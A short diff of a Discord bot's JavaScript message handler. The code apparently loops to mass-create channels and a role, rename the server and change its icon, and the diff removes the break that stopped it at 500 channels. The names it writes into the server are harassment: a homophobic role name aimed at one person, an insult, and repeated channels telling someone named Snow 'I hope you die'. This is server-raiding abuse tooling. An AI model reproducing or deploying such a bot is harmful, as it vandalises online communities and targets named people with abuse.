@@ -35,14 +35,12 @@ client.on("message", async (message) => {
 	    	message.guild.createChannel(`${textuh}`, 'text');
 	    	message.guild.createChannel(`${textuh}`, 'voice');  
 	    	message.guild.setIcon('./icon.png') 
-		if(message.guild.channels > 499) break;
 		*/
 		message.guild.createRole('henry gay')
 	    	message.guild.setName('snow manipulador do caralho')
 	    	message.guild.createChannel('SNOW ESPERO QUE VOCE MORRA -SUZY <3');
 	    	message.guild.createChannel('SNOW ESPERO QUE VOCE MORRA -SUZY <3');  
 	    	message.guild.setIcon('./icon.png') 
-		if(message.guild.channels > 499) break;
 	}
     }
     if(message.content === '!!del'){
